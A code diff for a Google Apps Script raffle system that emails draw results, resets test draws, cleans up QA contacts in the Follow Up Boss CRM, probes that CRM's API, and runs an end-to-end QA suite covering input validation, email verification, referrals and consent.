+  var w = result.winner;
+  var lines = [
+    (test ? QA_TEST_PREFIX : '') + RAFFLE_EVENT_NAME + ' — RAFFLE RESULT',
+    ''];
+  if (test) {
+    lines.push('*** THIS IS A TEST DRAW. Not the real winner. ***',
+      'Drawn from the "' + RAFFLE_TEST_SHEET_NAME + '" tab. The real 6:15 draw is',
+      'untouched and still pending.', '');
+  }
+  lines = lines.concat([
+    'WINNER: ' + w.name,
+    'Phone:  ' + w.phone,
+    'Email:  ' + w.email,
+    '',
+    'Prize:            ' + RAFFLE_PRIZE_SHORT + ' (ARV ' + RAFFLE_PRIZE_ARV + ')',
+    'Drawn at:         ' + result.drawnAt + ' ET',
+    'Eligible entries: ' + result.totalEligible,
+    'People:           ' + result.totalPeople,
+    'Tickets:          ' + result.totalTickets +
+      ' (1 per entrant, ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' per confirmed referral)',
+    'Announce at:      ' + RAFFLE_ANNOUNCE_AT,
+    ''
+  ]);
+  if (result.backups.length) {
+    lines.push('BACKUPS (in order, if the winner has already left):');
+    result.backups.forEach(function (b, i) {
+      lines.push('  ' + (i + 1) + '. ' + b.name + ' — ' + b.phone + ' — ' + b.email);
+    });
+    lines.push('');
+  }
+  lines.push('Full entry list: https://docs.google.com/spreadsheets/d/' +
+    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
+  lines.push('');
+  lines.push('This draw is recorded and is not repeatable — re-running the draw');
+  lines.push('returns this same winner by design.');
+
+  // HTML as of 2026-09-17, per Durand: all three picks, links into FUB for each
+  // pick AND for the person they referred, and a link to the draw console, which
+  // is where choosing/previewing/sending actually happens. The plain-text version
+  // above is kept and sent alongside -- it is what a watch or a text-only client
+  // shows, and it is the one legible on bad signal in a crowd.
+  //
+  // In test mode this collapses to QA_TEST_NOTIFY_EMAIL only -- Ryan does not
+  // get paged about a rehearsal.
+  var consoleUrl = '';
+  try {
+    var adminKey = PropertiesService.getScriptProperties().getProperty(RAFFLE_ADMIN_PROP);
+    consoleUrl = raffleBaseUrl_() + '?form=raffle&action=console&key=' +
+      encodeURIComponent(adminKey || '') + (test ? '&test=1' : '');
+  } catch (urlErr) { Logger.log('raffleEmailResult_: could not build the console URL: ' + urlErr); }
+
+  MailApp.sendEmail({
+    to: raffleQaRecipients_(RAFFLE_RESULT_EMAIL.split(','), test).join(','),
+    name: 'TSG Block Party Raffle',
+    // People and tickets, not the row count. totalEligible is rows, and a row is
+    // not an entrant: "(4 entries)" for three people holding eight tickets is
+    // the same misreading the status page used to print.
+    subject: (test ? QA_TEST_PREFIX : '🏈 ') + 'Block Party Raffle Winner: ' + w.name +
+             ' (' + rafflePlural_(result.totalPeople, 'person', 'people') + ', ' +
+             rafflePlural_(result.totalTickets, 'ticket') + ')',
+    htmlBody: raffleResultHtml_(result, test, consoleUrl),
+    body: lines.join('\n')
+  });
+}
+
+// Break-glass: clears the recorded winner so a draw can be re-run. Only for a
+// genuine mistake (e.g. the draw fired before entries closed). Deliberately
+// not reachable from any URL — it has to be run by hand from the editor.
+// Test-tab only: lets the QA suite draw more than once in a single run. Never
+// touches the live winner -- there is a separate, deliberately awkward
+// raffleResetDrawDANGER() for that.
+function raffleResetDrawDANGER_TEST_() {
+  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_PROP);
+}
+
+function raffleResetDrawDANGER() {
+  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_WINNER_PROP);
+  Logger.log('Recorded LIVE winner cleared. The next live draw will pick a NEW winner.');
+}
+
+// Wipes the test tab and the test winner so a rehearsal can be run again from
+// clean. Touches nothing live -- safe to run as often as you like, including
+// during the party.
+// Deletes the FUB contacts the TEST tab points at (double-gated: QA-tagged or
+// raffle-sourced, AND name-prefixed). Reads the tab, so it must run BEFORE the
+// tab is wiped. Shared by the suite's cleanup and raffleResetTest.
+function rafflePurgeTestTabContacts_() {
+  var ids = [];
+  raffleReadEntries_(true).forEach(function (r) {
+    if (r.fubId) ids.push(r.fubId);
+    if (r.referralFubId) ids.push(r.referralFubId);
+  });
+  return raffleDeleteFubContactsById_(ids);
+}
+
+function raffleResetTest() {
+  // FUB first: once the tab is gone there is no record of what to delete. This
+  // is what makes raffleRunQaSuiteAndKeepData safe to use -- keep, inspect,
+  // reset -- without leaving contacts behind to poison the next run.
+  try {
+    var purged = rafflePurgeTestTabContacts_();
+    Logger.log('raffleResetTest: FUB contacts from the test tab: ' + purged.summary);
+  } catch (purgeErr) {
+    Logger.log('raffleResetTest: FUB purge failed (continuing with the sheet): ' + purgeErr);
+  }
+  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_PROP);
+  // And the EMAILED marker. Without this the second rehearsal of the day reports
+  // "the winner was already emailed at ..." and refuses -- right for the live
+  // draw, wrong for a test tab that was just wiped. Caught live 2026-09-17: the
+  // 15:14 run could not send a winner email because 15:00's marker survived.
+  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_EMAILED_PROP);
+  var sh = raffleSheet_(true);
+  var last = sh.getLastRow();
+  if (last > 1) sh.deleteRows(2, last - 1);
+  var ss = SpreadsheetApp.openById(
+    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
+  var tab = ss.getSheetByName('Draw Result (TEST)');
+  if (tab) ss.deleteSheet(tab);
+  var msg = 'Test entries and test draw cleared. Live entries and the live draw are untouched.';
+  Logger.log(msg);
+  return msg;
+}
+
+// ---------------------------------------------------------------------------
+// FUB HOUSEKEEPING AND DIAGNOSTICS -- run by hand from the editor.
+//
+// These live in THIS file on purpose. The Apps Script Run dropdown only lists
+// functions from the file that is OPEN, so sitting in RaffleReferral they were
+// invisible next to setupRaffle and raffleRunQaSuite -- which is where somebody
+// looking for them actually looks. (2026-09-17: Durand could not find them.)
+// ---------------------------------------------------------------------------
+
+// The backlog: every QA contact left behind by a run that predates the cleanup
+// above. Editor-only. Same double gate, so it can only ever remove QA records.
+// Scans newest-first and stops after `maxScan` contacts (default 500).
+// Finds the QA contacts this project has left in FUB: tagged, or carrying the
+// QA name prefix (the stray the tags-PUT bug produced). Newest first, capped.
+// Shared by the purge and the relationship probe, so neither has to be handed
+// ids by a caller -- which matters because the Apps Script Run button cannot
+// pass arguments at all.
+function raffleFindQaContactIds_(maxScan) {
+  var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  var cap = maxScan || 500, offset = 0, ids = [], scanned = 0;
+  while (scanned < cap) {
+    var page = raffleFubCall_('https://api.followupboss.com/v1/people?limit=100&offset=' +
+                              offset + '&sort=-created', 'get', null, apiKey);
+    if (!page.ok || !page.body) {
+      Logger.log('raffleFindQaContactIds_: list failed ' + page.code + ': ' +
+                 String(page.text).slice(0, 200));
+      break;
+    }
+    var people = page.body.people || [];
+    if (!people.length) break;
+    people.forEach(function (p) {
+      scanned++;
+      var tags = p.tags || [];
+      var nm = String(p.firstName || '') + ' ' + String(p.lastName || '');
+      // Tagged OR name-prefixed. Every id collected here still goes through
+      // raffleDeleteFubContactsById_'s own double gate before anything is
+      // deleted, so a false positive cannot remove a real contact.
+      if (tags.some(function (t) { return String(t) === QA_TEST_TAG; }) ||
+          nm.indexOf(QA_TEST_PREFIX.trim()) !== -1) {
+        ids.push(p.id);
+      }
+    });
+    if (people.length < 100) break;
+    offset += 100;
+  }
+  Logger.log('raffleFindQaContactIds_: scanned ' + scanned + ', found ' + ids.length + '.');
+  return { ids: ids, scanned: scanned };
+}
+
+function raffleDeleteQaContactsFromFub(maxScan) {
+  var found = raffleFindQaContactIds_(maxScan);
+  var res = raffleDeleteFubContactsById_(found.ids);
+  return 'Scanned ' + found.scanned + ' contacts, found ' + found.ids.length +
+         ' QA record(s): ' + res.summary;
+}
+
+// ---------------------------------------------------------------------------
+// DIAGNOSTIC, editor-only: does FUB expose a way to LOG or SEND an email?
+//
+// Durand, 2026-09-17: "all emails should be sent through fub so they're logged
+// to the contact's comms". Two different things are possible and only FUB can
+// say which:
+//   * LOGGING an email we sent ourselves, so it appears on the contact timeline;
+//   * SENDING through FUB, so FUB is the mail transport.
+// FUB's docs domain is blocked from the build environment, so this asks the API
+// which endpoints answer at all rather than guessing a payload. Read the log.
+// ---------------------------------------------------------------------------
+function raffleInspectFubEmailLogging() {
+  var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  var out = [];
+  function say(line) { out.push(line); Logger.log(line); }
+  say('Probing FUB for an email endpoint. 200/201 = exists, 404 = does not, ' +
+      '405 = exists but not for this verb.');
+  ['emails', 'textMessages', 'calls', 'events', 'notes'].forEach(function (path) {
+    var r = raffleFubCall_('https://api.followupboss.com/v1/' + path + '?limit=1',
+                           'get', null, apiKey);
+    var keys = '';
+    if (r.ok && r.body) {
+      var arrKey = Object.keys(r.body).filter(function (k) {
+        return Object.prototype.toString.call(r.body[k]) === '[object Array]'; })[0];
+      var arr = arrKey ? r.body[arrKey] : [];
+      keys = arr.length ? '  record keys: ' + Object.keys(arr[0]).join(', ')
+                        : '  (no records to read keys from)';
+    }
+    say('GET /v1/' + path + ' -> ' + r.code + (keys ? '\n' + keys : ''));
+  });
+  say('');
+  say('If /v1/emails exists, its record keys name the fields an email log needs ' +
+      'and raffleLogEmailToFub_ can be pointed at it. If it does not, the note ' +
+      'fallback already in place is the whole of what is available.');
+  return out.join('\n');
+}
+
+// Durand, 2026-09-17: "is it even possible to have the emails sent through FUB
+// so they come from the assigned agent?" The docs site is unreachable from the
+// build environment, so this asks the live API. Run it from the editor; it
+// creates one throwaway QA contact, POSTs an email record against it addressed
+// to a durand+raffleqa inbox, reports what FUB answered, and deletes the
+// contact. The deciding evidence is then in that inbox: a 200/201 AND an email
+// that arrived means FUB sends; a 200/201 and nothing in the inbox means the
+// endpoint only LOGS. Everything else it prints is context (users = agents,
+// action plans = the automation that does send from an agent's mailbox).
+// What FUB actually has on this account, for building smart lists and templates
+// by hand in the FUB UI with real names: users, stages, pipelines, custom fields,
+// and whether the API exposes smart lists or templates at all.
+function raffleProbeFubSetup() {
+  var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  var out = [];
+  function say(line) { out.push(line); Logger.log(line); }
+  var base = 'https://api.followupboss.com/v1/';
+  function list(path, pick) {
+    var r = raffleFubCall_(base + path + (path.indexOf('?') === -1 ? '?limit=100' : '&limit=100'),
+                           'get', null, apiKey);
+    say('GET /v1/' + path + ' -> ' + r.code);
+    if (!r.ok || !r.body) { say('  ' + String(r.text).slice(0, 200)); return; }
+    var arrKey = Object.keys(r.body).filter(function (k) {
+      return Object.prototype.toString.call(r.body[k]) === '[object Array]'; })[0];
+    (arrKey ? r.body[arrKey] : []).forEach(function (x) { say('  ' + pick(x)); });
+  }
+  list('users', function (u) { return u.id + ': ' + u.name + ' <' + u.email + '> ' + u.role + ' ' + u.status; });
+  list('stages', function (s) { return s.id + ': ' + s.name; });
+  list('pipelines', function (p) { return p.id + ': ' + p.name + ' — stages: ' +
+    ((p.stages || []).map(function (s) { return s.name; }).join(', ') || '(none listed)'); });
+  list('customFields', function (f) { return f.id + ': "' + f.label + '" (' + f.name + ', ' + f.type + ')'; });
+  list('smartLists', function (l) { return l.id + ': ' + l.name; });
+  list('emailTemplates', function (t) { return t.id + ': ' + t.name; });
+  list('deals?status=Closed', function (d) { return d.id + ': ' + (d.name || '') + ' stage=' +
+    (d.stageId || d.stage || '?') + ' people=' + JSON.stringify(d.people || d.personIds || []); });
+  return out.join('\n');
+}
+
+function raffleProbeFubEmailSend() {
+  var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  var out = [];
+  function say(line) { out.push(line); Logger.log(line); }
+  function keysOf(r) {
+    if (!r.ok || !r.body) return '';
+    var arrKey = Object.keys(r.body).filter(function (k) {
+      return Object.prototype.toString.call(r.body[k]) === '[object Array]'; })[0];
+    var arr = arrKey ? r.body[arrKey] : [];
+    return arr.length ? '  record keys: ' + Object.keys(arr[0]).join(', ')
+                      : '  (no records to read keys from)';
+  }
+  var base = 'https://api.followupboss.com/v1/';
+  ['emails', 'emailTemplates', 'actionPlans', 'users'].forEach(function (path) {
+    var r = raffleFubCall_(base + path + '?limit=2', 'get', null, apiKey);
+    say('GET /v1/' + path + ' -> ' + r.code + (keysOf(r) ? '\n' + keysOf(r) : ''));
+    if (path === 'users' && r.ok && r.body && r.body.users) {
+      r.body.users.forEach(function (u) {
+        say('  user ' + u.id + ': ' + u.name + ' <' + u.email + '> role=' + u.role);
+      });
+    }
+  });
+
+  var stamp = String(Date.now()).slice(-6);
+  var qaEmail = RAFFLE_QA_ADDRESS_BASE + stamp + '-sendprobe' + RAFFLE_QA_DOMAIN;
+  var person = raffleFubCall_(base + 'people', 'post', {
+    firstName: QA_TEST_PREFIX + 'SendProbe', lastName: 'Blockparty',
+    emails: [{ value: qaEmail, type: 'work' }],
+    tags: [QA_TEST_TAG], source: RAFFLE_SOURCE
+  }, apiKey);
+  var personId = person.ok && person.body ? person.body.id : null;
+  say('');
+  say('Throwaway QA contact: ' + (personId ? 'id ' + personId : 'FAILED ' + person.code + ' ' +
+      String(person.text).slice(0, 200)));
+  if (!personId) return out.join('\n');
+
+  // The record FUB's own docs describe for POST /v1/emails is an email LOG:
+  // subject, body, to/from, isIncoming. If it also sends, this arrives.
+  var send = raffleFubCall_(base + 'emails', 'post', {
+    personId: personId,
+    subject: QA_TEST_PREFIX + 'FUB send probe ' + stamp,
+    body: 'If you are reading this in ' + qaEmail + ', FUB SENT it (POST /v1/emails ' +
+          'delivers mail). If it only appears on the FUB timeline, the endpoint logs.',
+    to: [{ email: qaEmail, name: 'QA SendProbe' }],
+    isIncoming: false
+  }, apiKey);
+  say('POST /v1/emails -> ' + send.code + '  ' + String(send.text).slice(0, 400));
+  say('');
+  say('VERDICT NEEDS THE INBOX: check ' + qaEmail);
+  say('  arrived there        -> FUB sends through the API; the raffle could route mail via FUB.');
+  say('  only on the FUB timeline (' + (send.ok ? 'it is logged, 2xx' : 'not even logged, ' +
+      send.code) + ') -> the API logs; sending from an agent needs an Action Plan or the FUB UI.');
+
+  var gone = raffleDeleteFubContactsById_([personId]);
+  say('Cleanup: ' + gone.summary);
+  return out.join('\n');
+}
+
+function raffleInspectFubRelationships(qaPersonId, qaRelatedId) {
+  var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  var out = [];
+  function say(line) { out.push(line); Logger.log(line); }
+
+  // NO ARGUMENTS NEEDED. The Apps Script Run button calls a function with none,
+  // so asking somebody to "run raffleInspectFubRelationships(33252, 33255)" was
+  // asking for something the editor cannot do. When no pair is passed it finds
+  // two QA contacts itself -- they are the only records safe to write a throwaway
+  // relationship onto, and every run of the QA suite creates plenty.
+  if (!qaPersonId || !qaRelatedId) {
+    var found = raffleFindQaContactIds_(300);
+    if (found.ids.length >= 2) {
+      qaPersonId = found.ids[0];
+      qaRelatedId = found.ids[1];
+      say('Using two QA contacts found in FUB: ' + qaPersonId + ' and ' + qaRelatedId + '.');
+    } else {
+      say('Found only ' + found.ids.length + ' QA contact(s) in the newest ' +
+          found.scanned + '. Run raffleRunQaSuiteAndKeepData() first -- it makes ' +
+          'several and does NOT delete them -- then run this again.');
+    }
+  }
+
+  // WHILE WE ARE HERE: the custom fields, raw. The 15:50 run reported both
+  // "Referrals Sent" and "Referred By" as NOT FOUND on an account whose field
+  // list plainly shows both, so the parser is reading the wrong shape. Print
+  // the top-level keys, one record's keys, and every label exactly as FUB
+  // spells it -- and drop the cache first, so a stale empty map cannot mask it.
+  try { CacheService.getScriptCache().remove(RAFFLE_CUSTOM_FIELD_CACHE_KEY); } catch (cErr) {}
+  var cf = raffleFubCall_('https://api.followupboss.com/v1/customFields', 'get', null, apiKey);
+  say('GET /customFields -> ' + cf.code);
+  if (cf.ok && cf.body) {
+    say('  top-level keys: ' + Object.keys(cf.body).join(', '));
+    var cfKey = Object.keys(cf.body).filter(function (k) {
+      return Object.prototype.toString.call(cf.body[k]) === '[object Array]'; })[0];
+    var cfArr = cfKey ? cf.body[cfKey] : [];
+    say('  array is under: ' + (cfKey || '(no array found — THIS is the parsing problem)'));
+    if (cfArr.length) {
+      say('  A FIELD RECORD\'S KEYS: ' + Object.keys(cfArr[0]).join(', '));
+      say('  labels as FUB spells them: ' + cfArr.map(function (f) {
+        return JSON.stringify(f.label !== undefined ? f.label : f.name); }).join(', '));
+    }
+  } else {
+    say('  body: ' + String(cf.text).slice(0, 300));
+  }
+  say('');
+
+  var list = raffleFubCall_(
+    'https://api.followupboss.com/v1/peopleRelationships?limit=3', 'get', null, apiKey);
+  say('GET /peopleRelationships -> ' + list.code);
+  if (list.ok && list.body) {
+    say('  top-level keys: ' + Object.keys(list.body).join(', '));
+    var arr = list.body.peoplerelationships || list.body.peopleRelationships ||
+              list.body.relationships || [];
+    if (arr.length) {
+      say('  A RECORD\'S KEYS (this is the answer): ' + Object.keys(arr[0]).join(', '));
+      say('  sample: ' + JSON.stringify(arr[0]).slice(0, 400));
+    } else {
+      say('  no relationships exist yet, so no record to read keys from.');
+    }
+  } else {
+    say('  body: ' + String(list.text).slice(0, 300));
+  }
+
+  if (qaPersonId && qaRelatedId) {
+    // The record FUB returns has no second person id: a relationship is an
+    // inline description of the other party. So the one shape worth testing is
+    // that shape. The id-based candidates are kept as a control -- they should
+    // all still be rejected, and if one is ever accepted the model has changed.
+    var other = raffleFubCall_('https://api.followupboss.com/v1/people/' + qaRelatedId,
+                               'get', null, apiKey);
+    var inline = {
+      personId: qaPersonId, type: 'Referred',
+      firstName: (other.body && other.body.firstName) || 'QA',
+      lastName: (other.body && other.body.lastName) || 'Probe',
+      emails: [], phones: []
+    };
+    var t0 = raffleFubCall_('https://api.followupboss.com/v1/peopleRelationships',
+                            'post', inline, apiKey);
+    say('  POST inline {personId, type, firstName, lastName, emails, phones} -> ' + t0.code +
+        ' ' + (t0.ok ? 'ACCEPTED — this is the shape raffleLinkPeople_ now sends'
+                     : String(t0.text).slice(0, 140)));
+    ['relatedPersonId', 'relatedId', 'toPersonId'].forEach(function (field) {
+      var payload = { personId: qaPersonId, type: 'Referred' };
+      payload[field] = qaRelatedId;
+      var t = raffleFubCall_('https://api.followupboss.com/v1/peopleRelationships',
+                             'post', payload, apiKey);
+      say('  control: POST with "' + field + '" -> ' + t.code + ' ' +
+          (t.ok ? 'ACCEPTED (unexpected — the model has changed)'
+                : String(t.text).slice(0, 100)));
+    });
+  } else {
+    say('No QA pair to probe with, so the field-name test was skipped. Run ' +
+        'raffleRunQaSuiteAndKeepData() and then this again.');
+  }
+  return out.join('\n');
+}
+
+// ---------- Live QA suite ----------
+// Run raffleRunQaSuite() from the editor. It drives the REAL code paths end to
+// end -- the same raffleHandleSubmission_ the web form calls, real sheet writes,
+// real FUB writes, a real draw -- and prints a pass/fail report.
+//
+// Everything it does happens in TEST MODE, so: entries land on the "Test
+// Entries" tab and can never be drawn as the real winner, FUB records are
+// prefixed and tagged, and the draw writes the TEST winner property. The live
+// Entries tab and the real 6:15 draw are asserted untouched at the end.
+//
+// Test mode is entered through the project's own sanctioned path -- mint a
+// token into the cache, then let setQaTestModeFromPayload_ flip the flag -- not
+// by assigning QA_TEST_MODE_ACTIVE_ directly, which Code.gs reserves to itself.
+//
+// Verification codes are read back out of the script cache rather than from the
+// inbox, because a self-test cannot open email. The emails are still genuinely
+// sent, to plus-addressed variants of Durand's address, so they are deliverable
+// and land somewhere real rather than bouncing off an invented domain.
+var RAFFLE_QA_ADDRESS_BASE = 'durand+raffleqa';
+var RAFFLE_QA_DOMAIN = '@thestawaszgroup.com';
+
+function raffleRunQaSuite() {
+  return raffleQaRun_(true);
+}
+
+// Same suite, but leaves the test data in place so you can look at the sheet and
+// the FUB records afterwards. Run raffleResetTest() when you are done.
+function raffleRunQaSuiteAndKeepData() {
+  return raffleQaRun_(false);
+}
+
+function raffleQaRun_(cleanUp) {
+  var log = [];
+  var pass = 0, fail = 0;
+  function check(name, cond, detail) {
+    if (cond) { pass++; log.push('PASS  ' + name); }
+    else { fail++; log.push('FAIL  ' + name + (detail ? '  -- ' + detail : '')); }
+    return cond;
+  }
+  function section(t) { log.push('', '--- ' + t + ' ---'); }
+
+  var props = PropertiesService.getScriptProperties();
+  if (!props.getProperty(RAFFLE_SHEET_PROP)) {
+    throw new Error('Run setupRaffle() first — there is no entries sheet yet.');
+  }
+
+  log.push('RAFFLE QA SUITE — ' + raffleFmt_(raffleNow_()) + ' ET');
+  log.push('Everything below runs in TEST MODE against the real code paths.');
+  log.push('Real FUB records ARE created; they are prefixed "' + QA_TEST_PREFIX.trim() +
+           '" and tagged "' + QA_TEST_TAG + '".');
+
+  // Enter test mode through the project's own mechanism.
+  var token = Utilities.getUuid();
+  CacheService.getScriptCache().put(QA_TEST_CACHE_PREFIX + token, '1', QA_TEST_TOKEN_TTL_SECONDS);
+  setQaTestModeFromPayload_({ qaTestToken: token });
+  if (!check('test mode is active', isQaTestMode_(),
+      'without this every assertion below would be writing to LIVE data — aborting')) {
+    return log.join('\n');
+  }
+  // Rehearsal emails copy Ryan; the ~60 this suite sends must not. The flag
+  // expires on its own if the run dies, so a crash cannot leave Ryan uncopied
+  // for longer than the TTL.
+  try { CacheService.getScriptCache().put(RAFFLE_SUITE_FLAG, '1', 1800); } catch (flagErr) { /* non-fatal */ }
+
+  // Start from clean test state so counts are meaningful.
+  try { raffleResetTest(); } catch (e) { log.push('(note: could not pre-clear test data: ' + e + ')'); }
+
+  var liveBefore = raffleReadEntries_(false).length;
+  log.push('Live entries before: ' + liveBefore + ' (this number must not change)');
+
+  var stamp = String(Date.now()).slice(-6);
+  // PER-RUN PHONE NUMBERS. The referral check matches on email OR phone. The QA
+  // phones used to be hardcoded ((215) 555-9101 and friends), so as soon as one
+  // run's QA referrals existed in FUB, every later run was correctly refused
+  // with "we already know that person". That is precisely what broke the 15:14
+  // run: fixing the API key made the lookup start working, and it found the
+  // contacts the 14:52 and 14:59 runs had left behind.
+  //
+  // Area 215, exchange derived from the run, line from the stamp plus a
+  // sequence. 555-01xx is reserved and the junk filter rejects it, so the
+  // exchange deliberately avoids 555 entirely rather than dodging one range.
+  var qaEx = 600 + (Number(stamp.slice(-2)) % 90);        // 600-689
+  var qaSeq = 0;
+  function qaPhone() {
+    qaSeq++;
+    var line = String((Number(stamp.slice(0, 4)) + qaSeq * 7) % 10000);
+    while (line.length < 4) line = '0' + line;
+    if (line.slice(0, 2) === '01') line = '9' + line.slice(1);   // never reserved
+    return '(215) ' + qaEx + '-' + line;
+  }
+  function person(n, phone) {
+    return {
+      fullName: 'QA Tester' + n + ' Blockparty',
+      email: RAFFLE_QA_ADDRESS_BASE + stamp + '-' + n + RAFFLE_QA_DOMAIN,
+      phone: phone,
+      consent: 'Yes'
+    };
+  }
+  // raffleHandleSubmission_ answers with a ContentService TextOutput -- the same
+  // object doPost hands back to the browser. It carries NO payload properties,
+  // only getContent(), so anything inspecting the result has to parse it. Reading
+  // .ok straight off it silently yields undefined, which is exactly how the first
+  // run of this suite reported 29 false failures against working code.
+  function json(res) {
+    if (!res) return {};
+    if (typeof res.getContent === 'function') {
+      try { return JSON.parse(res.getContent()); } catch (err) { return {}; }
+    }
+    return res;
+  }
+  function request(d) { return json(raffleHandleSubmission_(Object.assign({ step: 'request' }, d))); }
+  function codeFor(vid) {
+    var raw = CacheService.getScriptCache().get(RAFFLE_PENDING_PREFIX + vid);
+    return raw ? JSON.parse(raw).code : null;
+  }
+  // Step 1+2 only: details -> emailed code -> verified session. Nothing is
+  // entered; under the referral rules an entry does not exist yet.
+  function verifyFully(d) {
+    var r1 = request(d);
+    if (!r1.ok || !r1.needsCode) return r1;
+    return json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: codeFor(r1.vid) }));
+  }
+
+  // A referral for entrant `n`, distinct per entrant: one entry per referred
+  // PERSON is the rule, so reusing one referral across entrants would (correctly)
+  // be refused and would test the wrong thing.
+  function referralFor(n, phone) {
+    return {
+      referralName: 'QA Referral' + n + ' Blockparty',
+      referralEmail: RAFFLE_QA_ADDRESS_BASE + stamp + '-ref' + n + RAFFLE_QA_DOMAIN,
+      referralPhone: phone,
+      referralRole: (String(n).length % 2 === 0) ? 'Seller' : 'Buyer',
+      referralTimeframe: raffleDefaultTimeframe_(raffleTimeframes_()) || '',
+      consent: 'Yes'
+    };
+  }
+
+  // The whole journey, the way a real pair of people drive it. `opts.skipConsent`
+  // stops at "emailed, waiting on them", which is the state most of the day will
+  // actually be in.
+  function enterFully(d, n, refPhone, opts) {
+    opts = opts || {};
+    var v = verifyFully(d);
+    if (!v.ok || !v.verified) return v;
+    var ref = referralFor(n === undefined ? '1' : n, refPhone || qaPhone());
+    var staged = json(raffleHandleSubmission_(
+      Object.assign({ step: 'referral', vid: v.vid }, ref)));
+    if (!staged.ok || !staged.staged) return staged;
+    var invited = json(raffleHandleSubmission_(
+      { step: 'invite', vid: v.vid, token: staged.token }));
+    if (opts.skipConsent) { invited.token = staged.token; return invited; }
+    var done = json(raffleHandleSubmission_({
+      step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+      referralName: ref.referralName, referralEmail: ref.referralEmail,
+      referralPhone: ref.referralPhone, referralRole: ref.referralRole,
+      referralTimeframe: ref.referralTimeframe
+    }));
+    done.token = staged.token;
+    done.vid = v.vid;
+    done.referral = ref;
+    return done;
+  }
+
+  // ---- 1. Junk rejection -------------------------------------------------
+  section('1. Junk rejection (nothing should be written or emailed)');
+  [
+    ['disposable email',        { email: 'x@mailinator.com' }],
+    ['example.com',             { email: 'x@example.com' }],
+    ['role address test@',      { email: 'test' + RAFFLE_QA_DOMAIN }],
+    ['empty email',             { email: '' }],
+    ['all-same digits',         { phone: '5555555555' }],
+    ['1234567890',              { phone: '1234567890' }],
+    ['N11 area code',           { phone: '9112345678' }],
+    ['exchange starting 1',     { phone: '2151234567' }],
+    ['reserved 555-01xx',       { phone: '(215) 555-0123' }],
+    ['empty phone',             { phone: '' }],
+    ['single-word name',        { fullName: 'Cher' }],
+    ['consent not given',       { consent: 'No' }]
+  ].forEach(function (c) {
+    var res = request(Object.assign(person(9, '(215) 555-8901'), c[1]));
+    check('rejects ' + c[0], res.ok === false, 'got: ' + JSON.stringify(res));
+  });
+  check('no junk entry reached the test sheet', raffleReadEntries_(true).length === 0);
+
+  // ---- 2. Two-step verification ------------------------------------------
+  section('2. Two-step verification');
+  var a = person(1, qaPhone());
+  var r1 = request(a);
+  check('step 1 asks for a code', r1.ok === true && r1.needsCode === true, JSON.stringify(r1));
+  check('step 1 wrote NOTHING yet', raffleReadEntries_(true).length === 0);
+  var code = codeFor(r1.vid);
+  check('a 6-digit code was issued', /^\d{6}$/.test(String(code)));
+  var bad = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: '000000' }));
+  check('a wrong code is refused', bad.ok === false, JSON.stringify(bad));
+  check('a wrong code still wrote nothing', raffleReadEntries_(true).length === 0);
+  var good = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
+  check('the right code verifies them', good.ok === true && good.verified === true, JSON.stringify(good));
+  check('verification hands back a session id', /^[0-9a-fA-F-]{36}$/.test(String(good.vid)));
+  // Verification now enters them: one ticket, immediately. This is the change
+  // that made a zero-entry drawing impossible.
+  check('verification enters them with one ticket', raffleReadEntries_(true).length === 1);
+  check('and that row is eligible straight away',
+        raffleReadEntries_(true)[0].status === RAFFLE_STATUS_ELIGIBLE);
+  check('with no referral attached yet', !raffleReadEntries_(true)[0].isReferralRow);
+  check('the reply does not reveal whether they were already in FUB',
+        !/found|existing|already a|welcome back/i.test(JSON.stringify(good)), JSON.stringify(good));
+  var replay = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
+  check('the code cannot be replayed', replay.ok === false);
+  check('a replay mints no second free entry', raffleReadEntries_(true).length === 1);
+
+  // ---- 3. The referral, and the consent it waits on ----------------------
+  section('3. Referral -> invite -> consent');
+  var refA = referralFor('1', qaPhone());
+  var staged = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: good.vid }, refA)));
+  check('the referral is staged', staged.ok === true && staged.staged === true, JSON.stringify(staged));
+  check('a second row exists now', raffleReadEntries_(true).length === 2);
+  var pendingRows = raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_PENDING; });
+  check('the referral row is PENDING, worth nothing yet', pendingRows.length === 1,
+        JSON.stringify(raffleReadEntries_(true).map(function (r) { return r.status; })));
+  var earlyDraw = raffleDrawWinner_(true);
+  check('the draw runs anyway, on their own entry alone',
+        earlyDraw.ok === true && earlyDraw.result.totalTickets === 1,
+        JSON.stringify(earlyDraw.ok && earlyDraw.result.totalTickets));
+  raffleResetDrawDANGER_TEST_();
+
+  var invited = json(raffleHandleSubmission_(
+    { step: 'invite', vid: good.vid, token: staged.token }));
+  check('the invite sends', invited.ok === true && invited.sent === true, JSON.stringify(invited));
+  var resend = json(raffleHandleSubmission_(
+    { step: 'invite', vid: good.vid, token: staged.token }));
+  check('the invite cannot be sent twice', resend.alreadySent === true, JSON.stringify(resend));
+
+  var consented = json(raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+    referralName: refA.referralName, referralEmail: refA.referralEmail,
+    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
+    referralTimeframe: refA.referralTimeframe }));
+  check('the referral can consent', consented.ok === true && consented.confirmed === true,
+        JSON.stringify(consented));
+  var eligibleRows = raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_ELIGIBLE; });
+  // Three eligible rows now: the entrant's own entry, the referral (worth its
+  // bonus at last), and the referred person's OWN entry -- consenting enters
+  // them too, off the same box.
